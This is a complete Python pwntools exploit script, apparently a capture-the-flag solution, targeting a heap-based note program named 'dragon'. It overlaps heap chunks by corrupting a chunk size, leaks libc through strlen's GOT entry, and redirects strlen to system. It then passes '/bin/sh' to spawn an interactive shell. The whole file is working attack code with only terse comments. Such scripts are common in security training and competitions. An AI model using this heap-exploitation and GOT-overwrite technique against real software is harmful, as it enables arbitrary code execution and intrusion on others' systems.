from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

LOCAL = True

if LOCAL:
	p = process('./dragon')
else:
	p = remote('127.0.0.1',10001)

strlen_got = 0x602028

def add(size,name,content):
	p.recvuntil('>> ')
	p.sendline('1')
	p.recvuntil('please input note name size: ')
	p.sendline(str(size))
	p.recvuntil('please input note name: ')
	p.send(str(name))
	p.recvuntil('please input note content: ')
	p.send(str(content))


def edit(index,new_content):
	p.recvuntil('>> ')
	p.sendline('2')
	p.recvuntil('input note id: ')
	p.sendline(str(index))
	p.recvuntil('please input new note content: ')
	p.send(str(new_content))

def delete(index):
	p.recvuntil('>> ')
	p.sendline('3')
	p.recvuntil('input note id: ')
	p.sendline(str(index))

def list(index):
	p.recvuntil('>> ')
	p.sendline('4')
	p.recvuntil('input note id: ')
	p.sendline(str(index))

def main():
    add(0x20, 'AAAA', 'aaaa')
    add(0x20, 'BBBB', 'b'*0x18)
    add(0x20, 'CCCC', 'c'*0x18)
    raw_input('$')
    #modify chunk1's size to 0xd1 and free it.
    edit(0, 'A'*0x18+p64(0xd1))
    delete(1)

    #malloc the chunk just freed
    add(0x20,'DDDD','d'*0x18)
    #add(0x10,'EEEE','eeee')
    add(0x10,'EEEE',p64(strlen_got)+'d'*0x10)
    edit(3, p64(strlen_got))
    #info leak
    list(2)
    p.recvuntil('content: ')
    strlen_addr = u64(p.readline()[:-1].ljust(8, '\x00'))
    log.info("[*] strlen addr:{0}".format(hex(strlen_addr)))

    #get system() addr
    libc = ELF('./libc-2.19.so')
    libc_base = strlen_addr - libc.symbols['strlen']
    system_addr = libc_base + libc.symbols['system']
    log.info("[*] system addr:{0}".format(hex(system_addr)))
    #get shell
    edit(2, p64(system_addr))    
    edit(0, '/bin/sh\x00')
    p.interactive()

if __name__ == '__main__':
	main()
